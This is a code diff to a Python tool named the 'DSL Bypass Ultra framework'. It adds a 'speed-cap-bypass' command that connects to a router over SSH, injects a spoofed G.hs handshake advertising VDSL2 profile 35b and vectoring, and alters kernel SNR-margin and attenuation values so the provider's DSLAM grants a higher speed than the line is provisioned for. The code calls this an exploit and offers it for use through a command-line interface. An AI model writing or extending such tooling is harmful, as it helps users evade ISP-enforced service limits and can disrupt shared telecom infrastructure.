@@ -15,7 +15,7 @@ from src.hal.broadcom import BroadcomDslHal
 from src.vectoring_analyzer import VectoringAnalyzer
 from src.vectoring_manipulator import VectoringManipulator
 from src.entware_ssh import EntwareSSHInterface
-from src.spoofing import KernelDSLManipulator
+from src.spoofing import KernelDSLManipulator, GHSHandshakeSpoofer
 from src.line_diagnostics import LineDiagnostics
 from src.keenetic_dsl_interface import KeeneticDSLInterface
 import json
@@ -182,6 +182,55 @@ def run_cpe_emulator(args):
     emulator.connect_and_inform()
     print("\n🎉 CPE Emulator execution finished. 🎉")
 
+
+def run_speed_cap_bypass(args):
+    """
+    Orchestrates a series of spoofing actions to bypass DSLAM-enforced speed limits.
+    """
+    print("🚀 Initializing Speed Cap Bypass Exploit 🚀")
+    print(f"Targeting {args.target_ip} to upgrade to profile {args.profile} by simulating a {args.distance}m line.")
+
+    try:
+        ssh_interface = EntwareSSHInterface(host=args.target_ip)
+        manipulator = KernelDSLManipulator(ssh_interface, profile=args.profile)
+        handshake_spoofer = GHSHandshakeSpoofer(ssh_interface)
+        print(f"✅ Initialized KernelDSLManipulator with {manipulator.hal.__class__.__name__} HAL.")
+    except Exception as e:
+        print(f"❌ Failed to initialize exploit components: {e}")
+        return
+
+    # 1. Forcefully advertise superior capabilities via a spoofed G.hs handshake.
+    # This tricks the DSLAM into believing we support higher-end profiles from the start.
+    print("\nStep 1: Injecting fake G.hs capabilities to advertise Profile 35b and Vectoring...")
+    handshake_success = handshake_spoofer.craft_and_inject_fake_capabilities(
+        profile_35b=True,
+        force_vectoring=True
+    )
+    if handshake_success:
+        print("✅ Successfully injected spoofed capabilities.")
+    else:
+        print("⚠️ Failed to inject spoofed capabilities. The DSLAM may not accept the new profile.")
+
+    # 2. Manipulate kernel parameters to simulate a much shorter, cleaner line.
+    # This is the core of the exploit, making the DSLAM grant a higher data rate.
+    print(f"\nStep 2: Applying kernel-level manipulations to simulate a {args.distance}m line...")
+    # The target rate is set high (e.g., 150 Mbps) to let the physics model aim for the best possible
+    # parameters for the simulated distance, rather than being capped by a specific rate.
+    results = manipulator.set_target_profile(
+        target_rate_mbps=150.0,
+        target_distance_m=args.distance
+    )
+
+    print("\n--- Speed Cap Bypass Results ---")
+    print(json.dumps(results, indent=2))
+    print("--------------------------------")
+
+    if results.get("snr_margin_set") and results.get("attenuation_set"):
+        print("\n🎉 Speed Cap Bypass exploit finished successfully! The line should now retrain at a higher speed. 🎉")
+    else:
+        print("\n❌ Exploit finished with errors. The speed cap may not have been bypassed. ❌")
+
+
 def main():
     """
     Main entry point for the DSL Bypass Ultra framework.
@@ -277,6 +326,13 @@ def main():
     parser_bonding.add_argument('--line-ids', type=str, help='Comma-separated list of line IDs to include in the group.')
     parser_bonding.add_argument('--delay-ms', type=int, default=10, help='Differential delay compensation in milliseconds.')
     parser_bonding.set_defaults(func=run_bonding_exploit)
+
+    # Speed Cap Bypass mode
+    parser_bypass = subparsers.add_parser('speed-cap-bypass', help='Run the full speed cap bypass exploit.')
+    parser_bypass.add_argument('target_ip', help='The IP address of the target device.')
+    parser_bypass.add_argument('--profile', choices=['17a', '35b'], default='35b', help='The target VDSL2 profile to spoof.')
+    parser_bypass.add_argument('--distance', type=int, default=50, help='The simulated line distance in meters to achieve higher speeds.')
+    parser_bypass.set_defaults(func=run_speed_cap_bypass)
 
     args = parser.parse_args()
     args.func(args)
